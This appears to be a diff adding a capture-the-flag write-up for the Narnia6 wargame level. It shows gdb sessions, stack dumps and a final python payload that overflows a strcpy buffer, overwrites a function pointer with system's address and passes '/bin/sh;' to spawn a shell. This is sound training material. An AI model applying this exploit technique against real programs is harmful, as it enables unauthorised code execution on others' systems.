@@ -147,3 +147,87 @@ $ ^C
 ```
 here we go.
 
+##Narnia6
+
+This one is really fascinating. At first, I thought: how do I get around the assembly code. Later on, I just read a write up and learned about the technique used in this level. In short, we use the power of the libraries that are compiled with the program. Here particularly, we will utilize stdlib.h with it's system function, to execute our shell. It's not hard to notice we have a buffer overflow vulnerability in our code, due to lack of buffer size check in strcpy function. After launching gdb, I started inserting different inputs and observing our stack. First input:
+``` 
+(gdb) r $(python -c "print('A'*8+' '+'B'*8)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 $(python -c "print('A'*8+' '+'B'*8)")
+
+Breakpoint 6, 0x080486d7 in main ()
+(gdb) x/50wx $esp
+0xffffd5f0:	0xffffd608	0xffffd810	0x00000021	0x0804877b
+0xffffd600:	0x00000003	0xffffd6c4	0x42424242	0x42424242
+0xffffd610:	0x41414100	0x41414141	0x08048400	0x00000003
+0xffffd620:	0xf7fc7000	0x00000000	0x00000000	0xf7e2f637
+0xffffd630:	0x00000003	0xffffd6c4	0xffffd6d4	0x00000000
+0xffffd640:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
+0xffffd650:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
+0xffffd660:	0x00000000	0xae32dc04	0x94755214	0x00000000
+0xffffd670:	0x00000000	0x00000000	0x00000003	0x080484a0
+0xffffd680:	0x00000000	0xf7feeff0	0xf7fe9880	0xf7ffd000
+0xffffd690:	0x00000003	0x080484a0	0x00000000	0x080484c1
+0xffffd6a0:	0x080485a9	0x00000003	0xffffd6c4	0x08048730
+0xffffd6b0:	0x08048790	0xf7fe9880
+```
+we can see that b2 is aligned first, then b1, then our function pointer(0x08048400), the the amount of arguments to be checked (3) and so on. Now, let's overflow our buffer with a bit more chars:
+```
+(gdb) r $(python -c "print('A'*12+' '+'B'*12)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 $(python -c "print('A'*12+' '+'B'*12)")
+
+Breakpoint 6, 0x080486d7 in main ()
+(gdb) x/50wx $esp
+0xffffd5e0:	0xffffd5f8	0xffffd80c	0x00000021	0x0804877b
+0xffffd5f0:	0x00000003	0xffffd6b4	0x42424242	0x42424242
+0xffffd600:	0x42424242	0x41414100	0x41414141	0x00000000
+0xffffd610:	0xf7fc7000	0x00000000	0x00000000	0xf7e2f637
+0xffffd620:	0x00000003	0xffffd6b4	0xffffd6c4	0x00000000
+0xffffd630:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
+0xffffd640:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
+0xffffd650:	0x00000000	0x90b53d1b	0xaaf2930b	0x00000000
+0xffffd660:	0x00000000	0x00000000	0x00000003	0x080484a0
+0xffffd670:	0x00000000	0xf7feeff0	0xf7fe9880	0xf7ffd000
+0xffffd680:	0x00000003	0x080484a0	0x00000000	0x080484c1
+0xffffd690:	0x080485a9	0x00000003	0xffffd6b4	0x08048730
+0xffffd6a0:	0x08048790	0xf7fe9880
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+```
+here we can see that b1 overwritten fp's address, hence when continuing, the function pointers doesn't know what kind of address is 'AAAA'. Okay, now when we know we can manipulate our function pointer, we can use a powerful function in stdlib called system instead of puts as used originally in our code. This way, we can execute "system(b1)". Now all we have to do is to find the address of that function (function pointers point to addresses) and insert into b1 our shell path. First we find the system function address after it loads into our program:
+```
+Breakpoint 6, 0x080486d7 in main ()
+(gdb) p system
+$6 = {<text variable, no debug info>} 0xf7e51940 <system>
+(gdb) 
+```
+Great, now we craft a "/bin/sh;" into b1 (';' is used to ignure anything after our string). Luckly, we don't need to add more chars to b1 because our address aligns perfectly into the fp address:
+```
+(gdb) r $(python -c "print('\x2f\x62\x69\x6e\x2f\x73\x68\x3b'+'\x40\x19\xe5\xf7'+' '+'\x90')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 $(python -c "print('\x2f\x62\x69\x6e\x2f\x73\x68\x3b'+'\x40\x19\xe5\xf7'+' '+'\x90')")
+
+Breakpoint 6, 0x080486d7 in main ()
+(gdb) x/50wx $esp
+0xffffd5f0:	0xffffd608	0xffffd817	0x00000021	0x0804877b
+0xffffd600:	0x00000003	0xffffd6c4	0xffff003b	0x08048751
+0xffffd610:	0x6e69622f	0x3b68732f	0xf7e51940	0x00000000
+0xffffd620:	0xf7fc7000	0x00000000	0x00000000	0xf7e2f637
+0xffffd630:	0x00000003	0xffffd6c4	0xffffd6d4	0x00000000
+0xffffd640:	0x00000000	0x00000000	0xf7fc7000	0xf7ffdc04
+0xffffd650:	0xf7ffd000	0x00000000	0xf7fc7000	0xf7fc7000
+0xffffd660:	0x00000000	0x76169739	0x4c511929	0x00000000
+0xffffd670:	0x00000000	0x00000000	0x00000003	0x080484a0
+0xffffd680:	0x00000000	0xf7feeff0	0xf7fe9880	0xf7ffd000
+0xffffd690:	0x00000003	0x080484a0	0x00000000	0x080484c1
+0xffffd6a0:	0x080485a9	0x00000003	0xffffd6c4	0x08048730
+0xffffd6b0:	0x08048790	0xf7fe9880
+```
+as you can see, we overwritten fp with system's addres (0xf7e51940) and b1 contains our string. I added a ' ' & nop char so our program won't close. running ``./narnia6 $(python -c "print('\x2f\x62\x69\x6e\x2f\x73\x68\x3b'+'\x40\x19\xe5\xf7'+' '+'\x90')")`` will give us the pass.
